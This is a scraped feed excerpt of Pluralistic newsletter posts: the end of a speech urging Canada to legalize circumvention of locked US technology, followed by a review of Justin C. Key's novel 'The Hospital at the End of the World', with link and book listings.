orders these companies to shut down a government ministry (perhaps your ministry) or a corporation (perhaps your corporation) that they will do so.</p>\\n<p>Everyone in the world is waking up to this. In the EU, they\\'ve just created a new \"Tech Sovereignty, Security and Democracy\" czar, and they\\'re busily funding the \"Eurostack,\" a set of open, auditable replacements for US tech silos that can run on EU-based data-centres.</p>\\n<p>But they\\'re about to hit a wall. Because it doesn\\'t matter how great those Eurostack services are. If you can\\'t scrape, virtualize and jailbreak US Big Tech apps, so that you can exfiltrate your data, logs, file histories and permissions, no government ministry or large company can do that work by hand. It will challenge many households, who have entrusted US tech\\'s walled gardens with their financial data, family photos, groupchats, family calendars, and other structures that are not easily ported without cooperation from the tech giants. They are not going to cooperate with a mass exodus from their services. They will do everything they can to impede it.</p>\\n<p>Building the Eurostack without legalizing circumvention is like building housing for East Germans in West Berlin. It doesn\\'t matter how cool those apartments are, they\\'re gonna sit empty until you tear down the wall.</p>\\n<p>And administrative software is just for openers. Remember back in 2022, when Putin\\'s thugs looted millions of dollars\\' worth of John Deere tractors from Ukraine? These are permanently connected to John Deere\\'s cloud, which is how the John Deere company was able to trace them to Chechnya, and how they were able to send an over-the-air kill signal to the tractor that permanently bricked them.</p>\\n<p>And yes, I\\'ll freely admit that as a cyberpunk writer, this gives a little frisson of satisfaction. But if you only think about it for 10 seconds, you\\'ll realize that this means that Deere can immobilize any tractor in the world, or pretty much every tractor in Canada (and the rest of our tractors are likely from Massey Ferguson, another US giant also in thrall to Trump that can brick its tractors over the air, too).</p>\\n<p>This is exactly the threat we were warned of if we let Huawei supply our 5G infrastructure. Remember that? That whole \"Two Michaels\" business that we got stuck in when we let the US convince us that Huawei was gonna install landmines in our technological infrastructure? Well, you know how the saying goes: \"Every accusation is a confession.\"</p>\\n<p>But of course, China could brick the Chinese cloud-connected tech in Canada, like our solar inverters and batteries. The good news is that whether you\\'re a US natsec hawk or a China natsec hawk, you have the same path out of this trap. Namely: repealing Bill C-11, and legalizing circumvention so that we can deke out the locked bootloaders on our infrastructure and install open, auditable, transparent firmware on them. Because that is an infinitely more reliable way to render your systems into a known-good state than arresting random executives from giant Chinese companies.</p>\\n<p>And the good news is, everyone else in the world wants this, too, because they\\'re all facing the same risks as we are. So this isn\\'t really a technological project, in the sense of having a bunch of duelling firms all competing to come up with their own proprietary answer to an engineering problem. It\\'s more like a scientific project, in that we should have a commons, a git server filled with auditable, transparent, trustworthy drop-in code for whole classes of devices, from cars to TVs to smart speakers to ventilators to tractors to phone switches, that everyone contributes to and peer reviews.</p>\\n<p>We wouldn\\'t tolerate secrecy in our science. No one gets to keep the math used to calculate the load stresses on the joists holding the roof over our head a secret. We wouldn\\'t tolerate secrecy in the characteristics of the alloys in those joists, or even the wires carrying electricity through the walls. We should not tolerate secrecy in how our digital infrastructure works, either.</p>\\n<p>After all, a modern building is just a fancy casemod for a bunch of computers. Take all the computers out of a hospital and it becomes a morgue. There\\'s no secret medical science, and there should be no secret medical code, either.</p>\\n<p>So this is it. This is how we win. Trump has unwittingly recruited three armies to fight to end the enshittocene, the era in which all of our technology has turned to shit. There\\'s the digital rights hippies like me (who\\'ve been banging this drum since the 2000s); and then there\\'s the entrepreneurs and investors (eager for a chance to turn America\\'s tech trillions into Canada\\'s tech billions, making Canada into a global tech export powerhouse); and finally, there\\'s the national security hawks (who correctly worry that we are at risk of a kind of cyberwarfare the world has never seen before).</p>\\n<p>Normally, cyberwarfare involves hackers associated with an adversary state breaking into your critical systems, but Microsoft doesn\\'t have to break into your ministry\\'s Office365 and Outlook accounts to spy on you or brick your agencies. They already have root on your servers. For Trump, this is cyberwarfare on the easiest setting imaginable.</p>\\n<p>I started throwing this idea around right after Trump announced his first round of tariffs. There was this Canadian think-tank that was soliciting suggestions for Canadian countermeasures, and I sent them this stuff, and they said, \"Well, that would definitely work, but it\\'ll make Trump really mad at us.\"</p>\\n<p>Which, you know, true. But anything that works will make Trump mad at us. So again, I must fall back on my Canadian heritage here and apologize.</p>\\n<p>I\\'m sorry.</p>\\n<p>I\\'m sorry that I don\\'t have any empty gestures for us to deploy, only ideas for things that will work.</p>\\n<p>I mean, we can stick with the current plan, our retaliatory tariffs, which make everything we buy from America more expensive, and make us all poorer. That\\'ll do something. Like, it\\'ll certainly impose broad-spectrum pain on a bunch of American producers. If we decide to stop drinking delicious bourbon and switch to Wayne Gretzky\\'s undrinkable rye, there\\'s gonna be some corn farmer out there in a state that begins and ends with a vowel who\\'ll have trouble making payments on his John Deere tractor. But what did that farmer ever do to us?</p>\\n<p>On the other hand, if we go into business selling everyone in the world (including that farmer) (including our own farmer) reliable, auditable, regulated, transparent drop-in firmware replacement for that tractor, then we free that farmer from the rent-extracting scams that John Deere uses to drain his bank account. And since we remain that guy\\'s customer, maybe he\\'ll side with us against Trump, along with the hundreds of millions of American technology users who we can also set free from the app tax, from commercial surveillance that feeds authoritarian state surveillance, from the repair ripoffs, from ink that costs more than the semen of a Kentucky Derby winning stallion. They become our champions, too.</p>\\n<p>Because if we legalize jailbreaking, we will limit the blast radius of our counterattack, to the tech barons who each paid a million bucks to sit behind Trump on the inauguration dais and their shareholders, who are not everyday Americans. Everyday Americans have gotten poorer every year for 50 years, thanks to wage stagnation, wage theft, economic bubbles and skyrocketing health, education and housing costs.</p>\\n<p>They\\'ll tell you that most Americans own stock, but the amount of stock the average American holds rounds to zero. Nearly all US stock is held by the richest 10% of Americans \u2013 the ones who are backing Trump and getting rich off Trump \u2013 and legalizing jailbreaking is a targeted strike on just those people, which will only benefit our American cousins, the everyday people who\\'ve been abused for generations by these eminently guillotineable plutocrats.</p>\\n<p>Canada is in a good position to do this. We\\'ve got motive, means and opportunity, but we\\'re not the only ones. Most of the countries in the world are situated to take advantage of this opportunity, to become the \"disenshittification nation\" that supplies the world with wildly profitable software tools that fix America\\'s defective technology.</p>\\n<p>All it takes is one country defecting. That country gets to reap the benefit \u2013 the billions \u2013 of exporting those tools to the world, while the rest of us only get to enjoy the consumer surplus, the technology that works better and costs us less money and privacy to use.</p>\\n<p>You know how Ireland defected from the world\\'s tax treaties and, through regulatory arbitrage, made billions luring the world\\'s largest companies to establish domicile in Dublin, while depriving the world\\'s tax collectors of trillions? Regulatory arbitrage is the game everyone can play. When a country decides to become the Ireland for disenshittification, the nation where it\\'s legal to jailbreak locked technology, and export the tools to do so to everyone in the world with an internet connection and a payment method, they will get to reap the largest benefit. They\\'ll grab the hoarded monopoly rents of America\\'s tech giants and use them as fuel for a single-use rocket that launches their domestic tech sector into a stable orbit for generations.</p>\\n<p>Those American tech companies need to be relieved of the dead capital on their balance sheets. What are these companies doing with their looted trillions? Blowing it all on AI. They tell you there\\'s a lot of money to be made with AI, but no one can tell you where it\\'s going to come from.</p>\\n<p>This month, Google CEO Sundar Pichai said he\\'s going to recoup the hundreds of billions of dollars he\\'s pissed away on AI by turning Google into the world\\'s perfect engine for surveillance pricing. That\\'s when a company uses surveillance data to predict how desperate you are, and jacks up the price to the highest amount they think they can get you to part with.</p>\\n<p>This is a terrible idea of course, but it\\'s not just terrible in the sense of \"this is an idea Google should be ashamed of.\" It\\'s terrible in the sense of \"this won\\'t work because everyone will hate it and refuse to participate in it.\" It\\'s just another harebrained scheme to finally find a way to make AI profitable, or at least less unprofitable.</p>\\n<p>Compare that with my anti-circumvention plan. I can tell you exactly where the money in my plan is going to come from: it\\'s just sitting there on Big Tech\\'s balance sheets, waiting for us to go get it. We\\'ll make money by making products that people want, because it will make their tech better, and they will pay us for them.</p>\\n<p>I mean, I know that sounds old-fashioned. But what can I say? Sometimes, the old ways are best.</p>\\n<p>If there\\'s one thing Canada is good at, it\\'s going to other countries and digging up all their wealth. America\\'s tech giants have buried trillions of dollars they stole from the world, and we know exactly where it is. What\\'s more, we can dig it out from here. No travel required!</p>\\n<p>Let\\'s go get it.</p>\\n<p>Their margin is our opportunity.</p>\\n\\n<p></p>\\n\\n<p></p>\\n<ul>\\n<li>A Canadian platform for writing and documents https://cdox.ca/\\n</li>\\n<li>\\n<p>Archivist Browser https://www.monodivision.com/</p>\\n</li>\\n<li>\\n<p>Paranneaux Globes https://globesculptures.com/</p>\\n</li>\\n<li>\\n<p>Reuters &amp; RELX \u2013 Drop Your ICE Contracts! https://notechforice.com/lawletter/</p>\\n</li>\\n<li>\\n<p>Betting Against Elon Musk\u2019s Predictions on Polymarket Might be the New Inverse Cramer https://gizmodo.com/betting-against-elon-musks-predictions-on-polymarket-might-be-the-new-inverse-cramer-2000714552</p>\\n</li>\\n</ul>\\n\\n<p>\\n</p>\\n\\n<p>#20yrsago Censorship: Comparisons of Google China and Google https://blogoscoped.com/censored/</p>\\n<p>#20yrsago How the malicious software on Sony CDs works https://blog.citp.princeton.edu/2006/01/26/cd-drm-attacks-disc-recognition/</p>\\n<p>#15yrsago DHS kills color-coded terror alerts https://web.archive.org/web/20110127084925/https://www.wired.com/threatlevel/2011/01/threat-level-advisory-death/</p>\\n<p>#20yrsago Pirating the Oscars: 2011 edition https://waxy.org/2011/01/pirating_the_2011_oscars/</p>\\n<p>#20yrsago Copenhagen to replace squatter town with condos, 1000% rent-hikes https://web.archive.org/web/20060205034919/https://cphpost.dk/get/93464.html</p>\\n<p>#20yrsago How do music CDs infect your computer with DRM? https://blog.citp.princeton.edu/2006/01/30/cd-drm-attacks-installation/</p>\\n<p>#20yrsago Hollywood bigwigs answer your questions http://news.bbc.co.uk/2/hi/entertainment/4653534.stm</p>\\n<p>#20yrsago Anti-copying malware installs itself with dozens of games https://glop.org/starforce/</p>\\n<p>#20yrsago Museum shoelace trip shatters three Qing vases https://web.archive.org/web/20060207031357/http://www.cnn.com/2006/WORLD/europe/01/30/britain.museum.ap/index.html</p>\\n<p>#15yrsago Morrow\u2019s Diviner\u2019s Tale is a tight, literary ghost story https://memex.craphound.com/2011/01/30/morrows-diviners-tale-is-a-tight-literary-ghost-story/</p>\\n<p>#15yrsago Bolt and fastener chart: what\u2019s that dingus called? https://boltdepot.com/fastener-information/Type-Chart</p>\\n<p>#15yrsago Michael Swanwick\u2019s demonic Great Humongous Snow Pile https://floggingbabel.blogspot.com/2011/01/great-humongous-snow-pile-in-back-yard.html</p>\\n<p>#15yrsago Science fiction writers, editors, critics and publishers talk the future of publishing https://web.archive.org/web/20110129021818/http://www.sfsignal.com/archives/2011/01/mind-meld-the-future-of-publishing/</p>\\n<p>#10yrsago Tim O\u2019Reilly schools Paul Graham on inequality https://web.archive.org/web/20160126044144/medium.com/the-wtf-economy/what-paul-graham-is-missing-about-inequality-a9f7e1613059#.cagyco904a</p>\\n<p>#10yrsago Profile of James Love, \u201cBig Pharma\u2019s worst nightmare\u201d https://www.theguardian.com/society/2016/jan/26/big-pharmas-worst-nightmare</p>\\n<p>#10yrsago Dissipation of Economic Rents: when money is wasted chasing money https://timharford.com/2016/01/how-fighting-for-a-prize-knocks-down-its-value/</p>\\n<p>#10yrsago Bernie Sanders: a left wing, twenty-first century Ronald Reagan? https://www.salon.com/2016/01/25/bernie_sanders_could_be_the_next_ronald_reagan/</p>\\n<p>#10yrsago Charlie Jane Anders\u2019s All the Birds in the Sky: smartass, soulful novel https://memex.craphound.com/2016/01/26/charlie-jane-anderss-all-the-birds-in-the-sky-smartass-soulful-novel/</p>\\n<p>#10yrsago San Francisco Super Bowl: crooked accounting, mass surveillance and a screwjob for taxpayers &amp; homeless people https://www.jwz.org/blog/2016/01/fuck-the-super-bowl/</p>\\n<p>#10yrsago Same as the old boss: Justin Trudeau ready to sign Harper\u2019s EU free trade deal https://www.cbc.ca/news/politics/trudeau-eu-parliament-schulz-ceta-1.3415689</p>\\n<p>#10yrsago Danish government let America\u2019s Snowden-kidnapping jet camp out in Copenhagen https://web.archive.org/web/20160126202504/https://www.denfri.dk/2016/01/usa-sendte-fly-til-danmark-for-at-hapse-snowden/</p>\\n<p>#10yrsago Model forwards unsolicited dick pix, chat transcripts to girlfriends of her harassers https://www.buzzfeed.com/rossalynwarren/a-model-is-alerting-girlfriends-of-the-men-who-send-her-dick#.aukdQ6gYR</p>\\n<p>#5yrsago Understanding the aftermath of r/wallstreetbets https://pluralistic.net/2021/01/30/meme-stocks/#stockstonks</p>\\n<p>#5yrsago Thinking through Mitch McConnell\\'s plea for comity https://pluralistic.net/2021/01/30/meme-stocks/#comity</p>\\n<p>#5yrsago Further, on Mitch McConnell and comity https://pluralistic.net/2021/01/30/meme-stocks/#no-seriously</p>\\n<p>#5yrsago Petard (Part I) https://pluralistic.net/2025/01/30/landlord-telco-industrial-complex/#captive-market</p>\\n<p>#5yrsago \"North Korea\" targets infosec researchers https://pluralistic.net/2021/01/26/no-wise-kings/#willie-sutton</p>\\n<p>#5yrsago Evictions and utility cutoffs are covid comorbidities https://pluralistic.net/2021/01/26/no-wise-kings/#wealth-health</p>\\n<p>#5yrsago Brazil\\'s world-beating data breach https://pluralistic.net/2021/01/26/no-wise-kings/#sus</p>\\n<p>#5yrsago Twitter\\'s Project Blue Sky https://pluralistic.net/2021/01/26/no-wise-kings/#blue-sky</p>\\n\\n<p></p>\\n\\n<p></p>\\n<ul>\\n<li>Toronto: Enshittification and the Age of Extraction with Tim Wu, Jan 30\\nhttps://nowtoronto.com/event/cory-doctorow-and-tim-wu-enshittification-and-extraction/\\n</li>\\n<li>\\n<p>Salt Lake City: Enshittification at the Utah Museum of Fine Arts (Tanner Humanities Center), Feb 18\\nhttps://tanner.utah.edu/center-events/cory-doctorow/</p>\\n</li>\\n<li>\\n<p>Victoria: 28th Annual Victoria International Privacy &amp; Security Summit, Mar 3-5\\nhttps://www.rebootcommunications.com/event/vipss2026/</p>\\n</li>\\n<li>\\n<p>Berkeley: Bioneers keynote, Mar 27\\nhttps://conference.bioneers.org/</p>\\n</li>\\n<li>\\n<p>Berlin: Re:publica, May 18-20\\nhttps://re-publica.com/de/news/rp26-sprecher-cory-doctorow</p>\\n</li>\\n<li>\\n<p>Berlin: Enshittification at Otherland Books, May 19\\nhttps://www.otherland-berlin.de/de/event-details/cory-doctorow.html</p>\\n</li>\\n<li>\\n<p>Hay-on-Wye: HowTheLightGetsIn, May 22-25\\nhttps://howthelightgetsin.org/festivals/hay/big-ideas-2</p>\\n</li>\\n</ul>\\n\\n<p>\\n</p>\\n\\n<ul>\\n<li>How the Internet Got Worse (Masters in Business)\\nhttps://www.youtube.com/watch?v=auXlkuVhxMo\\n</li>\\n<li>\\n<p>Enshittification (Jon Favreau/Offline):\\nhttps://crooked.com/podcast/the-enshittification-of-the-internet-with-cory-doctorow/</p>\\n</li>\\n<li>\\n<p>Why Big Tech is a Trap for Independent Creators (Stripper News)\\nhttps://www.youtube.com/watch?v=nmYDyz8AMZ0</p>\\n</li>\\n<li>\\n<p>Enshittification (Creative Nonfiction podcast)\\nhttps://brendanomeara.com/episode-507-enshittification-author-cory-doctorow-believes-in-a-new-good-internet/</p>\\n</li>\\n<li>\\n<p>Enshittification with Plutopia\\nhttps://plutopia.io/cory-doctorow-enshittification/</p>\\n</li>\\n</ul>\\n\\n<p>\\n</p>\\n\\n<ul>\\n<li>\"Canny Valley\": A limited edition collection of the collages I create for Pluralistic, self-published, September 2025\\n</li>\\n<li>\\n<p>\"Enshittification: Why Everything Suddenly Got Worse and What to Do About It,\" Farrar, Straus, Giroux, October 7 2025\\nhttps://us.macmillan.com/books/9780374619329/enshittification/</p>\\n</li>\\n<li>\\n<p>\"Picks and Shovels\": a sequel to \"Red Team Blues,\" about the heroic era of the PC, Tor Books (US), Head of Zeus (UK), February 2025 (https://us.macmillan.com/books/9781250865908/picksandshovels).</p>\\n</li>\\n<li>\\n<p>\"The Bezzle\": a sequel to \"Red Team Blues,\" about prison-tech and other grifts, Tor Books (US), Head of Zeus (UK), February 2024 (thebezzle.org).</p>\\n</li>\\n<li>\\n<p>\"The Lost Cause:\" a solarpunk novel of hope in the climate emergency, Tor Books (US), Head of Zeus (UK), November 2023 (http://lost-cause.org).</p>\\n</li>\\n<li>\\n<p>\"The Internet Con\": A nonfiction book about interoperability and Big Tech (Verso) September 2023 (http://seizethemeansofcomputation.org). Signed copies at Book Soup (https://www.booksoup.com/book/9781804291245).</p>\\n</li>\\n<li>\\n<p>\"Red Team Blues\": \"A grabby, compulsive thriller that will leave you knowing more about how the world works than you did before.\" Tor Books http://redteamblues.com.</p>\\n</li>\\n<li>\\n<p>\"Chokepoint Capitalism: How to Beat Big Tech, Tame Big Content, and Get Artists Paid, with Rebecca Giblin\", on how to unrig the markets for creative labor, Beacon Press/Scribe 2022 https://chokepointcapitalism.com</p>\\n</li>\\n</ul>\\n\\n<p>\\n</p>\\n\\n<ul>\\n<li>\"Unauthorized Bread\": a middle-grades graphic novel adapted from my novella about refugees, toasters and DRM, FirstSecond, 2026\\n</li>\\n<li>\\n<p>\"Enshittification, Why Everything Suddenly Got Worse and What to Do About It\" (the graphic novel), Firstsecond, 2026</p>\\n</li>\\n<li>\\n<p>\"The Memex Method,\" Farrar, Straus, Giroux, 2026</p>\\n</li>\\n<li>\\n<p>\"The Reverse-Centaur\\'s Guide to AI,\" a short book about being a better AI critic, Farrar, Straus and Giroux, June 2026</p>\\n</li>\\n</ul>\\n\\n<p>\\n</p>\\n\\n<p>Today\\'s top sources:</p>\\n<p>Currently writing: \"The Post-American Internet,\" a sequel to \"Enshittification,\" about the better world the rest of us get to have now that Trump has torched America (1007 words today, 17531 total)</p>\\n<ul>\\n<li>\"The Reverse Centaur\\'s Guide to AI,\" a short book for Farrar, Straus and Giroux about being an effective AI critic. LEGAL REVIEW AND COPYEDIT COMPLETE.\\n</li>\\n<li>\\n<p>\"The Post-American Internet,\" a short book about internet policy in the age of Trumpism. PLANNING.</p>\\n</li>\\n<li>\\n<p>A Little Brother short story about DIY insulin PLANNING</p>\\n</li>\\n</ul>\\n\\n<p></p>\\n<p>This work \u2013 excluding any serialized fiction \u2013 is licensed under a Creative Commons Attribution 4.0 license. That means you can use it any way you like, including commercially, provided that you attribute it to me, Cory Doctorow, and include a link to pluralistic.net.</p>\\n<p>https://creativecommons.org/licenses/by/4.0/</p>\\n<p>Quotations and images are not included in this license; they are included either under a limitation or exception to copyright, or on the basis of a separate license. Please exercise caution.</p>\\n\\n\\n<p>Blog (no ads, tracking, or data-collection):</p>\\n<p>Pluralistic.net</p>\\n<p>Newsletter (no ads, tracking, or data-collection):</p>\\n<p>https://pluralistic.net/plura-list</p>\\n<p>Mastodon (no ads, tracking, or data-collection):</p>\\n<p>https://mamot.fr/@pluralistic</p>\\n<p>Medium (no ads, paywalled):</p>\\n<p>https://doctorow.medium.com/</p>\\n<p>Twitter (mass-scale, unrestricted, third-party surveillance and advertising):</p>\\n<p>https://twitter.com/doctorow</p>\\n<p>Tumblr (mass-scale, unrestricted, third-party surveillance and advertising):</p>\\n<p>https://mostlysignssomeportents.tumblr.com/tagged/pluralistic</p>\\n<p>\"When life gives you SARS, you make sarsaparilla\" -Joey \"Accordion Guy\" DeVilla</p>\\n<p>READ CAREFULLY: By reading this, you agree, on behalf of your employer, to release me from all obligations and waivers arising from any and all NON-NEGOTIATED agreements, licenses, terms-of-service, shrinkwrap, clickwrap, browsewrap, confidentiality, non-disclosure, non-compete and acceptable use policies (\"BOGUS AGREEMENTS\") that I have entered into with your employer, its partners, licensors, agents and assigns, in perpetuity, without prejudice to my ongoing rights and privileges. You further represent that you have the authority to release me from any BOGUS AGREEMENTS on behalf of your employer.</p>\\n<p>ISSN: 3066-764X</p>'}</p> <p>\u6293\u53d6\u65f6\u95f4: 2026-02-05 08:40:49</p>"},{"location":"pluralistic.net/Pluralistic-%20Justin%20Key%27s%20-The%20Hospital%20at%20the%20End%20Of%20the%20World-%20%2804%20Feb%202026%29_20260204/","title":"Pluralistic: Justin Key's \"The Hospital at the End Of the World\" (04 Feb 2026)Today\\'s linksJustin Key\\'s \"The Hospital at the End Of the World\" (permalink)Hey look at this (permalink)Object permanence (permalink)Upcoming appearances (permalink)Recent appearances (permalink)Latest books (permalink)Upcoming books (permalink)Colophon (permalink)How to get Pluralistic:","text":"<p>\u6765\u6e90: pluralistic.net \u53d1\u5e03\u65f6\u95f4: Wed, 04 Feb 2026 15:48:33 +0000 \u94fe\u63a5: https://pluralistic.net/2026/02/04/slice-bees/</p> <p>{'type': 'text/html', 'language': None, 'base': 'https://pluralistic.net/feed/', 'value': '<p>\\n</p>\\n\\n<ul>\\n<li>Justin Key\\'s \"The Hospital at the End Of the World\": A biopunk medical thriller from a major new talent.\\n</li>\\n<li>Hey look at this: Delights to delectate.\\n</li>\\n<li>Object permanence: Coconut volunteers; Astro Noise; Rich old men behind \"Millennials Rising\"; Stop the \"Stop the Steal\" steal; \"Chasing Shadows.\"\\n</li>\\n<li>Upcoming appearances: Where to find me.\\n</li>\\n<li>Recent appearances: Where I\\'ve been.\\n</li>\\n<li>Latest books: You keep readin\\' em, I\\'ll keep writin\\' \\'em.\\n</li>\\n<li>Upcoming books: Like I said, I\\'ll keep writin\\' \\'em.\\n</li>\\n<li>Colophon: All the rest.\\n</li>\\n</ul>\\n<p></p>\\n\\n<p>\\n</p>\\n\\n<p>Justin C. Key is one of the most exciting new science fiction writers of this decade and today, Harpercollins publishes his debut novel, The Hospital at the End of the World:</p>\\n<p>https://www.harpercollins.com/products/the-hospital-at-the-end-of-the-world-justin-c-key?variant=43822999928866</p>\\n<p>I\\'ve followed Key\\'s work for more than a decade, ever since I met him as a student while teaching at the Clarion West writers\\' workshop in Seattle. At the time, Key impressed me \u2013 a standout writer in a year full of standouts \u2013 and I wasn\\'t surprised in the least when Harpercollins published a collection of his afrofuturist/Black horror stories, The World Wasn\\'t Ready For You, in 2023:</p>\\n<p>https://pluralistic.net/2023/09/19/justin-c-key/#clarion-west-2015</p>\\n<p>This is virtually unheard of. Major genre publishers generally don\\'t publish short story collections at all, let alone short story collections by writers who haven\\'t already established themselves as novelists. The exceptions are rare as hell, and they\\'re names to conjure with: Ted Chiang, say, or Kelly Link:</p>\\n<p>https://pluralistic.net/2024/02/13/the-kissing-song/#wrack-and-roll</p>\\n<p>But anyone who read World Wasn\\'t Ready immediately understood why Key\\'s work qualified him for an exception to this iron law of publishing. Key is an MD and a practicing psychiatrist, and he combines keen insights into personal relations and human frailty with a wild imagination, deep compassion, and enviable prose chops.</p>\\n<p>Hospital at the End of the World is Key\\'s first novel, and it\\'s terrific. Set in a not-so-distant future in which an AI-driven health monopolist called The Shepherd Organization controls much of the lives of everyday Americans, Hospital follows Pok, a young New Yorker who dreams of becoming an MD. Pok\\'s father is also a doctor, famous for his empathic, human-centric methods and his scientific theories about the role that \"essence\" (a psychospiritual connection between doctors and patients) plays in clinical settings.</p>\\n<p>The story opens with Pok hotly anticipating an acceptance letter from The Shepherd Organization, and the beginning of his new life as a medical student. But when word arrives, Pok learns that he has been rejected from every medical school in the TSO orbit. In desperate confusion, he works with shadowy hackers in a bid to learn why his impeccable application and his top grades resulted in this total rejection. That\\'s when he learns that someone had sabotaged his application and falsified his grades, and, not long thereafter, he learns that the saboteur was his father.</p>\\n<p>To make things worse, Pok\\'s father has fallen grievously ill \u2013 so ill, in fact, that he ends up in a Shepherd Organization hospital, despite his deep enmity for TSO and its AI-driven practice of medicine. Pok doesn\\'t accompany his father, though \u2013 he has secured a chance to sit a make-up exam in a desperate bid to get into med school. By the time he is finished with his exam, though, he learns that his father has died, and all that is left of him is an AI-powered chatbot that is delivered to Pok\\'s apartment along with a warning to flee, because he is in terrible danger from the Shepherd Organization.</p>\\n<p>Thus begins Pok\\'s tale as he goes underground in a ubiquitous AI surveillance dystopia, seeking sanctuary in New Orleans, hoping to make it to the Hippocrates, the last holdout from America\\'s AI-based medicine and surveillance dystopia. Pok\\'s father learned to practice medicine at Hippocrates, and had urged Pok to study there, even securing a full-ride scholarship for him. But Pok had no interest in the mystical, squishy, sentimental ethos of the Hippocrates, and had been determined to practice the Shepherd Organization\\'s rigorous, cold, data-driven form of medicine.</p>\\n<p>Now, Pok has no choice. Hitchhiking, hopping freight cars, falling into company with other fugitives, Pok makes his way to New Orleans, a city guarded by tall towers that radiate energy that dampens both the punishing weather events that would otherwise drown the city and the data signals by which the Shepherd Organization tracks and controls the American people.</p>\\n<p>This is the book\\'s second act, a medical technothriller that sees Pok as an untrusted outsider in the freshman class at Hippocrates med school, amidst a strange and alarming plague that has sickened the other refugees from TSO America who have taken up residence in New Orleans. Pok has to navigate factions within the med school and in New Orleans society, even as he throws himself into the meat grinder of med school and unravels the secrets of his father and his own birth.</p>\\n<p>What follows is a masterful and suspenseful work of science fiction informed by Key\\'s own medical training and his keen sense of the human psyche. It\\'s one part smart whodunnit, one part heist thriller, and one part revolutionary epic, and at its core is a profound series of provocations and thought experiments about the role that deep human connection and empathy play in medical care. It\\'s a well-structured, well-paced sf novel that probes big, urgent contemporary themes while still engrossing the reader in the intimate human relations of its principals. A wonderful debut novel from a major new writer.`</p>\\n\\n<p></p>\\n\\n<p></p>\\n<ul>\\n<li>Ken MacLeod: Imagined Futures https://plutopia.io/ken-macleod-imagined-futures/\\n</li>\\n<li>\\n<p>Elbows Up: How Canada Can Disenshittify Its Tech, Reclaim Its Sovereignty, and Launch a New Tech Sector Into a Stable Orbit https://archive.org/details/disenshittification-nation</p>\\n</li>\\n<li>\\n<p>HOPE IS NOW A 501(C)(3) NON-PROFIT ORGANIZATION https://2600.com/content/hope-now-501c3-non-profit-organization</p>\\n</li>\\n<li>\\n<p>Department of Justice appeals Google search monopoly ruling https://www.theverge.com/tech/873438/google-antitrust-case-doj-states-appeal</p>\\n</li>\\n<li>\\n<p>List of Kennedy Center cancellations during the Trump administration https://en.wikipedia.org/wiki/List_of_Kennedy_Center_cancellations_during_the_Trump_administration (h/t Amanda Marcotte)</p>\\n</li>\\n</ul>\\n\\n<p>\\n</p>\\n\\n<p>#20yrsago AOL/Yahoo: our email tax will make the net as good as the post office! https://www.nytimes.com/2006/02/05/technology/postage-is-due-for-companies-sending-email.html</p>\\n<p>#20yrsago Volunteers ferry 15k coconuts every day to Indian temple http://news.bbc.co.uk/2/hi/south_asia/4677320.stm</p>\\n<p>#15yrsago Wikileaks ACTA cables confirm it was a screwjob for the global poor https://arstechnica.com/tech-policy/2011/02/secret-us-cables-reveal-acta-was-far-too-secret/</p>\\n<p>#10yrsago Laura Poitras\u2019s Astro Noise: indispensable book and gallery show about mass surveillance https://www.wired.com/2016/02/snowdens-chronicler-reveals-her-own-life-under-surveillance/</p>\\n<p>#10yrsago How to prepare to join the Internet of the dead https://archive.org/details/Online_No_One_Knows_Youre_Dead</p>\\n<p>#10yrsago Who funds the \u201cMillennials Rising\u201d Super PAC? Rich old men. https://web.archive.org/web/20160204223020/https://theintercept.com/2016/02/04/millennials-rising-super-pac-is-95-funded-by-old-men/</p>\\n<p>#10yrsago They promised us a debate over TPP, then they signed it without any debate https://www.techdirt.com/2016/02/03/countries-sign-tpp-whatever-happened-to-debate-we-were-promised-before-signing/</p>\\n<p>#5yrsago Stop the \"Stop the Steal\" steal https://pluralistic.net/2021/02/04/vote-machine-tankies/#ess</p>\\n<p>#5yrsago Organic fascism https://pluralistic.net/2021/02/04/vote-machine-tankies/#pastel-q</p>\\n<p>#5yrsago Ron Deibert\\'s \"Chasing Shadows\" https://pluralistic.net/2025/02/04/citizen-lab/#nso-group</p>\\n\\n<p></p>\\n\\n<p></p>\\n<ul>\\n<li>Salt Lake City: Enshittification at the Utah Museum of Fine Arts (Tanner Humanities Center), Feb 18\\nhttps://tanner.utah.edu/center-events/cory-doctorow/\\n</li>\\n<li>\\n<p>Montreal (remote): Fedimtl, Feb 24\\nhttps://fedimtl.ca/</p>\\n</li>\\n<li>\\n<p>Victoria: 28th Annual Victoria International Privacy &amp; Security Summit, Mar 3-5\\nhttps://www.rebootcommunications.com/event/vipss2026/</p>\\n</li>\\n<li>\\n<p>Berkeley: Bioneers keynote, Mar 27\\nhttps://conference.bioneers.org/</p>\\n</li>\\n<li>\\n<p>Berlin: Re:publica, May 18-20\\nhttps://re-publica.com/de/news/rp26-sprecher-cory-doctorow</p>\\n</li>\\n<li>\\n<p>Berlin: Enshittification at Otherland Books, May 19\\nhttps://www.otherland-berlin.de/de/event-details/cory-doctorow.html</p>\\n</li>\\n<li>\\n<p>Hay-on-Wye: HowTheLightGetsIn, May 22-25\\nhttps://howthelightgetsin.org/festivals/hay/big-ideas-2</p>\\n</li>\\n</ul>\\n\\n<p>\\n</p>\\n\\n<ul>\\n<li>Why Everything Got Worse and What to Do About It (Jordan Harbinger)\\nhttps://www.jordanharbinger.com/cory-doctorow-why-everything-got-worse-and-what-to-do-about-it/\\n</li>\\n<li>\\n<p>How the Internet Got Worse (Masters in Business)\\nhttps://www.youtube.com/watch?v=auXlkuVhxMo</p>\\n</li>\\n<li>\\n<p>Enshittification (Jon Favreau/Offline):\\nhttps://crooked.com/podcast/the-enshittification-of-the-internet-with-cory-doctorow/</p>\\n</li>\\n<li>\\n<p>Why Big Tech is a Trap for Independent Creators (Stripper News)\\nhttps://www.youtube.com/watch?v=nmYDyz8AMZ0</p>\\n</li>\\n<li>\\n<p>Enshittification (Creative Nonfiction podcast)\\nhttps://brendanomeara.com/episode-507-enshittification-author-cory-doctorow-believes-in-a-new-good-internet/</p>\\n</li>\\n</ul>\\n\\n<p>\\n</p>\\n\\n<ul>\\n<li>\"Canny Valley\": A limited edition collection of the collages I create for Pluralistic, self-published, September 2025\\n</li>\\n<li>\\n<p>\"Enshittification: Why Everything Suddenly Got Worse and What to Do About It,\" Farrar, Straus, Giroux, October 7 2025\\nhttps://us.macmillan.com/books/9780374619329/enshittification/</p>\\n</li>\\n<li>\\n<p>\"Picks and Shovels\": a sequel to \"Red Team Blues,\" about the heroic era of the PC, Tor Books (US), Head of Zeus (UK), February 2025 